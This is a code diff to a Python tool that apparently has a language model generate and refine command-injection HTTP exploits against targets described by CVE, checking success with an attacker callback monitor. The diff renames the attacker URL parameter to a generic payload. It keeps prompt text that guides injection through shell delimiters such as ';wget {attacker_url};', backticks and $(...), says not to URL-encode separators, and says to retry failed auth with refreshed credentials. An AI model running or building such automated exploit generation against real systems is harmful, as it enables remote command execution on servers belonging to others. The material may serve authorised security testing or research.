@@ -42,7 +42,7 @@ class CommandInjectionHTTPHandler(VulnHandler):
         description: str,
         code_texts: List[str],
         target: Optional[str],
-        attacker_url: str,
+        payload: str,
         target_profile: Optional[str] = None,
         validation_feedback: Optional[str] = None,
     ) -> List[dict]:
@@ -50,7 +50,7 @@ class CommandInjectionHTTPHandler(VulnHandler):
             description=description,
             code_files=code_texts,
             target=target,
-            attacker_url=attacker_url,
+            payload=payload,
             target_profile=target_profile,
             validation_feedback=validation_feedback,
         )
@@ -64,7 +64,7 @@ def generate_command_injection_http(
     vuln_type: Optional[str] = None,
     temperature: float = 0.2,
     max_tokens: int = 4000,
-    attacker_url: Optional[str] = None,
+    payload: Optional[str] = None,
     probe_target: bool = False,
     auto_validate: bool = False,
     max_iterations: Optional[int] = None,
@@ -81,7 +81,7 @@ def generate_command_injection_http(
 ) -> GenerationResult:
     handler_key = vuln_type or CommandInjectionHTTPHandler.name
     handler = CommandInjectionHTTPHandler()
-    atk_url = attacker_url or SETTINGS.attacker_url
+    final_payload = payload or SETTINGS.payload
     if cvenumber:
         get_web_infomation(cvenumber)
 
@@ -102,7 +102,7 @@ def generate_command_injection_http(
         f"description: {description}\n"
         f"target: {target or '<none>'}\n"
         f"vuln_type: {handler_key}\n"
-        f"attacker_url: {atk_url}"
+        f"payload: {final_payload}"
     )
 
     max_iters = max(1, max_iterations or SETTINGS.max_iterations)
@@ -126,7 +126,7 @@ def generate_command_injection_http(
         description,
         code_texts,
         target,
-        atk_url,
+        final_payload,
         None,
         None,
     )]
@@ -281,7 +281,7 @@ def generate_command_injection_http(
                 feedback_for_next = _build_attempt_feedback(
                     parse_issues,
                     validation_results,
-                    atk_url,
+                    final_payload,
                     monitor_running,
                     validation_error,
                 )
@@ -332,7 +332,7 @@ def generate_command_injection_http(
 def _build_attempt_feedback(
     parse_issues: List[str],
     validation_results: Optional[List[ValidationResult]],
-    attacker_url: str,
+    payload: str,
     monitor_active: bool,
     validation_error: Optional[str] = None,
 ) -> Optional[str]:
@@ -379,12 +379,12 @@ def _build_attempt_feedback(
     if monitor_active:
         messages.append(
             "Attacker monitor did NOT receive the expected wget callback. Ensure the payload executes wget "
-            f"{attacker_url} directly (no URL encoding of separators) and that the vulnerable parameter maps to command execution."
+            f"{payload} directly (no URL encoding of separators) and that the vulnerable parameter maps to command execution."
         )
     else:
         messages.append(
             "Attacker monitor is unavailable, so success could not be confirmed automatically. Still refine the payload to trigger wget "
-            f"{attacker_url} if possible."
+            f"{payload} if possible."
         )
 
     if parse_issues or failed_validation:
@@ -393,7 +393,7 @@ def _build_attempt_feedback(
             "1) Encoding: rebuild the BODY to mirror required fields, parameter casing/order, and payload syntax; match the server's expected encoding (JSON vs form-urlencoded vs raw) and reuse its injection delimiters (e.g., '$(...)', '$(+ ...)', backticks, pipes).\n"
             "2) Status/redirects: if 301/302, retry with the redirected path (e.g., '/path' -> '/path/'); if 401/403, refresh Cookie/credentials or follow the hinted auth flow; align Host/Origin/Referer with the target.\n"
             "3) Method: if a POST with empty body fails, resend the same request as GET to handle endpoints that only read query params.\n"
-            "4) Payload: use a minimal, paired delimiter around the payload (e.g., ';wget {attacker_url};'), avoid extra quotes/backticks/brackets unless already present, and do NOT URL-encode separators; escape only what JSON requires."
+            "4) Payload: use a minimal, paired delimiter around the payload (e.g., ';{payload};'), avoid extra quotes/backticks/brackets unless already present, and do NOT URL-encode separators; escape only what JSON requires."
         )
 
     return "\n\n".join(messages) if messages else None
